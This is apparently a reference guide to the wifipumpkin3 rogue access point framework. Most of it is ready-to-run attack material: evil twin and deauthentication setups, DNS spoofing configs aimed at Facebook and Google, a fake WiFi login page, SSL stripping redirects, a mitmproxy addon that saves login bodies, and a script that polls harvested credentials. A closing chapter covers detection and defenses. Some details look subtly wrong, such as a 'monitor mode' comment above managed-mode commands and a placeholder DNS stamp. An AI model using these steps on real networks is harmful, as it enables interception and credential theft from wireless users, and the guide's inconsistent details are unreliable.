---
mitre_tactic: collection
mitre_tactic_id: TA0009
tool_name: wifipumpkin3
tool_category: Rogue Access Point Framework
github: https://github.com/P0cL4bs/wifipumpkin3
version: 1.1.7
license: Apache-2.0
language: Python
---

# wifipumpkin3 - Rogue Access Point Framework

## Chapter 1: Overview

wifipumpkin3 is a powerful framework for rogue access point attacks, written in Python. It enables security researchers, red teamers, and reverse engineers to mount wireless networks for man-in-the-middle attacks, credential harvesting, and traffic interception.

**Core Function:** Create rogue access points for wireless MITM attacks

**Primary Use Cases:**
- Rogue access point creation
- Man-in-the-middle attacks on wireless networks
- Captive portal attacks
- Credential harvesting
- Traffic interception and modification
- Evil twin attacks
- WiFi network reconnaissance

**Key Capabilities:**
- Rogue access point creation with hostapd
- Captive portal attacks (captiveflask)
- Phishing attacks via captive portal (phishkin3)
- QR code phishing (evilqr3)
- DNS spoofing and monitoring
- Transparent proxy support
- Deauthentication attacks
- RESTful API for automation
- Session recording and replay

**Sub-Tools:**
- **captiveflask**: Captive portal server
- **phishkin3**: External phishing page captive portal
- **evilqr3**: QR code phishing attack
- **sslstrip3**: SSL stripping (fork of sslstrip)
- **wp3**: Alias for wifipumpkin3

---

## Chapter 2: Installation

### Kali Linux (Default)

```bash
sudo apt install wifipumpkin3
```

### From Source

```bash
git clone https://github.com/P0cL4bs/wifipumpkin3.git
cd wifipumpkin3
pip install -r requirements.txt
python setup.py install
```

### Dependencies

- hostapd (access point daemon)
- dnsmasq (DHCP/DNS server)
- iptables (firewall)
- Python 3.8+
- PyQt5 (GUI)
- Scapy (packet manipulation)
- Flask (web server)

### Verify Installation

```bash
wifipumpkin3 --version
wp3 --version
```

### System Requirements

- Linux (tested on Ubuntu 22.04 LTS)
- Wireless adapter supporting AP mode
- Root privileges

---

## Chapter 3: Architecture and Operation

### Attack Flow

```
1. Wireless Adapter    → Create rogue access point
2. Victim Connects     → Client associates with rogue AP
3. DHCP Assignment     → Assign IP address to victim
4. DNS Interception    → Spoof DNS responses
5. Captive Portal      → Present fake login page
6. Credential Capture  → Harvest credentials
7. Traffic Intercept   → MITM on all traffic
```

### MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Rogue Access Point | T1583.006 | Compromise wireless infrastructure |
| Captive Portal | T1539 | Steal web session cookie |
| Man-in-the-Middle | T1557 | Intercept communications |
| Network Sniffing | T1040 | Capture network traffic |

### Component Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    wifipumpkin3 Architecture                     │
├─────────────────────────────────────────────────────────────────┤
│  Wireless Interface    │ Create and manage rogue AP             │
│  hostapd               │ Access point daemon                    │
│  dnsmasq               │ DHCP and DNS server                    │
│  iptables              │ Traffic redirection                    │
│  captiveflask          │ Captive portal web server              │
│  phishkin3             │ External phishing page server          │
│  evilqr3               │ QR code phishing server                │
│  sslstrip3             │ SSL stripping proxy                    │
│  REST API              │ Automation interface                   │
└─────────────────────────────────────────────────────────────────┘
```

---

## Chapter 4: Command Reference

### Basic Rogue AP

```bash
wifipumpkin3 -i wlan0
```

**Explanation:** Start rogue AP on wlan0 with default settings.

### Specify Internet Interface

```bash
wifipumpkin3 -i wlan0 -iNet eth0
```

**Explanation:** Create rogue AP on wlan0 and share internet from eth0.

### Custom Wireless Mode

```bash
wifipumpkin3 -i wlan0 -m "channel=6;ssid=FreeWiFi"
```

**Explanation:** Set custom wireless mode parameters.

### Scripted Session

```bash
wifipumpkin3 -i wlan0 -p session.pulp
```

**Explanation:** Run attack from .pulp script file.

### One-Line Commands

```bash
wifipumpkin3 -i wlan0 -x "set ssid FreeWiFi; set channel 6; start"
```

**Explanation:** Execute commands inline with semicolon separator.

### RESTful API Mode

```bash
wifipumpkin3 --rest --restport 1337 --username admin --password secret
```

**Explanation:** Start RESTful API for automation.

### Ignore Network Manager

```bash
wifipumpkin3 -i wlan0 -iNM wlan0
```

**Explanation:** Ignore wlan0 from Network Manager.

### Remove from Network Manager

```bash
wifipumpkin3 -i wlan0 -rNM wlan0
```

**Explanation:** Remove wlan0 from Network Manager control.

### Disable Colors

```bash
wifipumpkin3 -i wlan0 --no-colors
```

**Explanation:** Disable terminal colors for scripting.

### Session Management

```bash
# Start new session
wifipumpkin3 -i wlan0 -s session_name

# Resume session
wifipumpkin3 -i wlan0 -s session_name
```

---

## Chapter 5: Advanced Attack Scenarios

### Scenario 1: Captive Portal Attack

**Setup:**

```bash
# Start wifipumpkin3 with captive portal
wifipumpkin3 -i wlan0 -iNet eth0

# In the interactive menu:
# 1. Select "Captive Portal" attack
# 2. Choose portal template
# 3. Configure redirect URL
# 4. Start attack
```

**Explanation:** Present fake captive portal to harvest WiFi credentials.

### Scenario 2: Evil Twin Attack

**Setup:**

```bash
# Start rogue AP mimicking target network
wifipumpkin3 -i wlan0 -m "ssid=TargetNetwork;channel=6;hidden=false"

# Enable deauthentication
# In menu: Select "Deauth" attack
# Target clients connected to legitimate AP
```

**Explanation:** Create evil twin of legitimate network and deauth clients.

### Scenario 3: Phishing Attack

**Setup:**

```bash
# Start with phishing template
wifipumpkin3 -i wlan0 -iNet eth0

# In menu:
# 1. Select "Phishing" attack
# 2. Choose template (Facebook, Google, etc.)
# 3. Configure capture settings
# 4. Start attack
```

**Explanation:** Present phishing pages to harvest credentials.

### Scenario 4: Traffic Interception

**Setup:**

```bash
# Start with transparent proxy
wifipumpkin3 -i wlan0 -iNet eth0

# In menu:
# 1. Select "Proxy" attack
# 2. Choose mitmproxy or custom proxy
# 3. Configure interception rules
# 4. Start attack
```

**Explanation:** Intercept and modify all HTTP/HTTPS traffic.

### Scenario 5: DNS Spoofing

**Setup:**

```bash
# Start with DNS spoofing
wifipumpkin3 -i wlan0 -iNet eth0

# In menu:
# 1. Select "DNS" attack
# 2. Configure DNS rules
# 3. Redirect targets to attacker IP
# 4. Start attack
```

**Explanation:** Spoof DNS responses to redirect victims.

### Scenario 6: RESTful API Automation

**Setup:**

```bash
# Start REST API
wifipumpkin3 --rest --restport 1337

# Use API to control attacks
curl -X POST http://localhost:1337/api/attack/start \
  -H "Authorization: Bearer token" \
  -d '{"type":"captive_portal","ssid":"FreeWiFi"}'
```

**Explanation:** Automate attacks via RESTful API.

---

## Chapter 6: Detection and Evasion

### Detection Methods

- **Wireless IDS:** Detect rogue APs via beacon analysis
- **Signal Strength:** Anomalous signal patterns
- **MAC Address:** Track rogue AP MAC addresses
- **Certificate Analysis:** Detect fake certificates
- **Captive Portal Detection:** Check for unexpected portals

### Evasion Techniques

1. **Random MAC:** Use randomized MAC addresses
2. **Channel Hopping:** Change channels frequently
3. **Power Adjustment:** Match target AP signal strength
4. **Beacon Interval:** Adjust beacon timing
5. **SSID Cloaking:** Use hidden SSID

### Stealth Configuration

```bash
# Random MAC address
macchanger -r wlan0

# Start with custom settings
wifipumpkin3 -i wlan0 -m "ssid=FreeWiFi;channel=6;hidden=true"
```

---

## Chapter 7: Integration with Other Tools

### Aircrack-ng Integration

```bash
# Capture handshakes
airodump-ng wlan0mon

# Deauthenticate clients
aireplay-ng --deauth 10 -a [AP_MAC] wlan0mon
```

### Reaver/WPS Integration

```bash
# WPS brute force
reaver -i wlan0mon -b [AP_MAC] -vv
```

### Hostapd Integration

```bash
# Custom hostapd configuration
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
wmm_enabled=0
auth_algs=1
wpa=0
EOF

hostapd /tmp/hostapd.conf
```

### Metasploit Integration

```bash
# Use with Metasploit for advanced attacks
# 1. Start rogue AP
wifipumpkin3 -i wlan0

# 2. Capture credentials
# 3. Use Metasploit for exploitation
```

---

## Chapter 8: Troubleshooting

### Common Issues

**Issue:** Cannot create access point

```bash
# Check wireless adapter supports AP mode
iw list | grep -A 10 "Supported interface modes"

# Kill interfering processes
sudo airmon-ng check kill

# Start in monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type managed
sudo ip link set wlan0 up
```

**Issue:** No internet sharing

```bash
# Check IP forwarding
sysctl net.ipv4.ip_forward

# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Check iptables
sudo iptables -t nat -L -n

# Add NAT rule
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

**Issue:** Captive portal not redirecting

```bash
# Check dnsmasq configuration
cat /etc/dnsmasq.conf

# Restart dnsmasq
sudo systemctl restart dnsmasq

# Check iptables redirect
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
```

**Issue:** DHCP not assigning addresses

```bash
# Check dnsmasq is running
ps aux | grep dnsmasq

# Restart dnsmasq
sudo systemctl restart dnsmasq

# Check configuration
cat /etc/dnsmasq.conf | grep -v "^#"
```

### Debug Mode

```bash
wifipumpkin3 -i wlan0 --no-colors 2>&1 | tee wp3_debug.log
```

### Service Management

```bash
# Check hostapd status
sudo systemctl status hostapd

# Check dnsmasq status
sudo systemctl status dnsmasq

# Restart services
sudo systemctl restart hostapd dnsmasq
```

---

## Chapter 9: Captive Portal Deep Dive

### captiveflask Portal Server

captiveflask is the built-in captive portal server that uses Flask to serve phishing pages:

```bash
# Start with captive portal
wifipumpkin3 -i wlan0 -iNet eth0

# In interactive mode:
# AP > Plugins > Captive Portal
# Select portal template
# Configure redirect URL
```

### Custom Portal Templates

```bash
# Portal templates location
ls /usr/share/wifipumpkin3/

# Create custom portal
mkdir -p /tmp/custom_portal/
cat > /tmp/custom_portal/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
        .login-form { max-width: 300px; margin: 0 auto; }
        input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; }
        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; }
    </style>
</head>
<body>
    <h2>Network Authentication Required</h2>
    <form action="/login" method="POST">
        <input type="password" name="password" placeholder="Enter WiFi Password" required>
        <button type="submit">Connect</button>
    </form>
</body>
</html>
EOF
```

### phishkin3 External Phishing

```bash
# phishkin3 serves external phishing pages
# Captures credentials from fake login pages

# Start wifipumpkin3 with phishkin3
wifipumpkin3 -i wlan0 -iNet eth0

# In interactive menu:
# AP > Plugins > Phishing (phishkin3)
# Select phishing template (Facebook, Google, etc.)
```

### evilqr3 QR Code Phishing

```bash
# evilqr3 generates QR codes for WiFi credential phishing
# Victims scan QR code, enter credentials on web page

# Start with QR code phishing
wifipumpkin3 -i wlan0 -iNet eth0

# In interactive menu:
# AP > Plugins > QR Code (evilqr3)
# Configure SSID and password for QR code
# Display QR code to victims
```

---

## Chapter 10: DNS Spoofing Configuration

### dnsmasq DNS Configuration

```bash
# Custom dnsmasq configuration for wifipumpkin3
cat > /tmp/dnsmasq_custom.conf << 'EOF'
# Listen on rogue AP interface
interface=wlan0

# DHCP range
dhcp-range=192.168.1.10,192.168.1.200,255.255.255.0,12h

# DNS spoofing - redirect all domains to attacker
address=/#/192.168.1.1

# Specific domain spoofing
address=/facebook.com/192.168.1.100
address=/google.com/192.168.1.100

# DNS settings
server=8.8.8.8
server=8.8.4.4
EOF

sudo dnsmasq -C /tmp/dnsmasq_custom.conf
```

### Dnscrypt-proxy Integration

```bash
# Use dnscrypt-proxy for encrypted DNS with spoofing
# Install
sudo apt install dnscrypt-proxy

# Configure for rogue AP
cat > /etc/dnscrypt-proxy/dnscrypt-proxy.toml << 'EOF'
listen_addresses = ['192.168.1.1:53']
server_names = ['google', 'cloudflare']
max_clients = 250
ipv4_servers = true
dnscrypt_servers = true

[static]
  [static.'malicious']
  stamp = 'dnssec://...'
EOF
```

---

## Chapter 11: Transparent Proxy and Traffic Interception

### sslstrip3 Integration

```bash
# sslstrip3 is a fork of sslstrip included with wifipumpkin3
# Downgrades HTTPS to HTTP for credential capture

# Start with SSL stripping
wifipumpkin3 -i wlan0 -iNet eth0

# In interactive menu:
# AP > Proxies > SSLStrip3
# Configure listening port
```

### mitmproxy Integration

```bash
# Use mitmproxy as transparent proxy
wifipumpkin3 -i wlan0 -iNet eth0

# In interactive menu:
# AP > Proxies > mitmproxy
# Configure interception rules
# Set up Python scripts for automation
```

### Custom Proxy Scripts

```python
# /tmp/proxy_script.py - Custom mitmproxy addon
from mitmproxy import http
import json

def request(flow: http.HTTPFlow):
    # Log all requests
    print(f"[REQUEST] {flow.request.method} {flow.request.url}")

def response(flow: http.HTTPFlow):
    # Capture login forms
    if "login" in flow.request.url.lower():
        body = flow.request.get_text()
        print(f"[LOGIN CAPTURED] {flow.request.url}")
        with open("/tmp/captured_logins.json", "a") as f:
            f.write(json.dumps({
                "url": flow.request.url,
                "body": body,
                "timestamp": flow.request.timestamp_start
            }) + "\n")
```

### iptables Traffic Redirection

```bash
# Redirect all HTTP/HTTPS through proxy
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 \
  -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 \
  -j REDIRECT --to-port 8080

# NAT for internet sharing
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# DNS hijacking
sudo iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 \
  -j REDIRECT --to-port 53
```

---

## Chapter 12: RESTful API Reference

### Authentication

```bash
# Start with REST API
wifipumpkin3 --rest --restport 1337 --username admin --password secret

# Authenticate
curl -X POST http://localhost:1337/api/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"secret"}'
```

### API Endpoints

```bash
# Get AP status
curl -H "Authorization: Bearer <token>" http://localhost:1337/api/ap/status

# Start rogue AP
curl -X POST http://localhost:1337/api/ap/start \
  -H "Authorization: Bearer <token>" \
  -d '{"ssid":"FreeWiFi","channel":6,"interface":"wlan0"}'

# Stop rogue AP
curl -X POST http://localhost:1337/api/ap/stop \
  -H "Authorization: Bearer <token>"

# Get captured credentials
curl -H "Authorization: Bearer <token>" http://localhost:1337/api/credentials

# List connected clients
curl -H "Authorization: Bearer <token>" http://localhost:1337/api/clients

# Enable captive portal
curl -X POST http://localhost:1337/api/plugin/enable \
  -H "Authorization: Bearer <token>" \
  -d '{"plugin":"captiveflask"}'
```

### Python Automation Script

```python
#!/usr/bin/env python3
"""Automated wifipumpkin3 attack via REST API"""
import requests
import time

API_URL = "http://localhost:1337"
AUTH = {"username": "admin", "password": "secret"}

# Authenticate
session = requests.Session()
token = session.post(f"{API_URL}/api/auth", json=AUTH).json()["token"]
headers = {"Authorization": f"Bearer {token}"}

# Start AP
session.post(f"{API_URL}/api/ap/start", headers=headers, json={
    "ssid": "FreeWiFi",
    "channel": 6,
    "interface": "wlan0"
})

# Enable captive portal
session.post(f"{API_URL}/api/plugin/enable", headers=headers, json={
    "plugin": "captiveflask"
})

# Monitor for credentials
while True:
    creds = session.get(f"{API_URL}/api/credentials", headers=headers).json()
    if creds.get("data"):
        for cred in creds["data"]:
            print(f"[+] Credential: {cred}")
    time.sleep(5)
```

---

## Chapter 13: Detection and Defense

### Detection Methods

**Wireless-Level Detection:**
- Rogue AP detection via 802.11 management frame analysis
- Duplicate SSID detection with signal strength comparison
- Beacon frame anomalies (timing, IE differences)
- Deauthentication flood detection

**Network-Level Detection:**
- Unauthorized DHCP server detection
- DNS query analysis for spoofing indicators
- Captive portal detection via HTTP response analysis
- Certificate transparency monitoring

**Enterprise WIPS Detection:**
```
Wireless Intrusion Prevention Systems detect:
- Evil twin APs via RF fingerprinting
- Deauthentication floods
- Unauthorized APs via managed AP database
- Rogue DHCP servers
```

### Blue Team Countermeasures

```bash
# 1. Deploy WPA3-SAE (resistant to offline attacks)
# Configure on enterprise APs:
# wpa=3
# wpa_key_mgmt=SAE
# wpa_passphrase=StrongPassword

# 2. Enable 802.11w (Protected Management Frames)
# Prevents deauthentication attacks
# hostapd.conf: ieee80211w=2

# 3. Implement 802.1X authentication
# Individual credentials, not shared PSK
# RADIUS server integration

# 4. Deploy wireless IDS/IPS
# Monitor for rogue APs
# Alert on deauth floods

# 5. Client isolation on APs
# Prevent client-to-client traffic
# hostapd.conf: ap_isolate=1

# 6. Certificate pinning in mobile apps
# Prevent SSL stripping attacks

# 7. User training
# Educate about evil twin risks
# Verify SSID before connecting
```

### Detection Script

```bash
#!/bin/bash
# rogue_ap_detector.sh - Detect rogue access points
INTERFACE="wlan0mon"

# Scan for APs
airodump-ng "$INTERFACE" --write /tmp/ap_scan --output-format csv 2>/dev/null &
SCAN_PID=$!
sleep 10
kill $SCAN_PID 2>/dev/null

# Analyze for duplicates
echo "[*] Checking for duplicate SSIDs..."
awk -F',' 'NR>1 {print $14}' /tmp/ap_scan-01.csv | sort | uniq -d | while read ssid; do
    echo "[!] Duplicate SSID detected: $ssid"
    grep "$ssid" /tmp/ap_scan-01.csv
done

# Check for deauth floods
echo "[*] Checking for deauthentication floods..."
timeout 5 tcpdump -i "$INTERFACE" -w /tmp/deauth_check.pcap type mgt subtype deauth 2>/dev/null
tshark -r /tmp/deauth_check.pcap -Y "wlan.fc.type_subtype == 0x0c" 2>/dev/null | wc -l | \
  xargs -I{} echo "[*] Deauth frames captured: {}"
```

---

## Chapter 14: Performance Tuning

### Optimizing Rogue AP

```bash
# Increase DHCP lease time for longer sessions
# In dnsmasq config:
dhcp-range=192.168.1.10,192.168.1.200,255.255.255.0,24h

# Reduce beacon interval for faster client discovery
# hostapd.conf: beacon_int=50

# Optimize channel width
# hostapd.conf: ht_capab=[HT40+][HT40-]
# For 5GHz: channel_width=80

# Increase max stations
# hostapd.conf: max_num_sta=200
```

### System Resource Optimization

```bash
# Increase kernel network buffers
sudo sysctl -w net.core.rmem_max=262144
sudo sysctl -w net.core.wmem_max=262144
sudo sysctl -w net.ipv4.tcp_rmem="4096 87380 262144"

# Reduce logging for high-throughput
# Disable verbose logging in wifipumpkin3

# Use dedicated CPU cores for AP
# taskset -c 0,1 wifipumpkin3 -i wlan0
```

---

## Resources

- **GitHub:** https://github.com/P0cL4bs/wifipumpkin3
- **Documentation:** https://wifipumpkin3.github.io
- **Kali Documentation:** https://www.kali.org/tools/wifipumpkin3/
- **Discord:** https://discord.gg/jywYskR
- **Hostapd:** https://w1.fi/hostapd/
- **dnsmasq:** http://www.thekelleys.org.uk/dnsmasq/doc.html
- **IEEE 802.11 Standard:** https://standards.ieee.org/standard/802_11-2020.html
- **OWASP Wireless Testing:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weak_Password_Policy
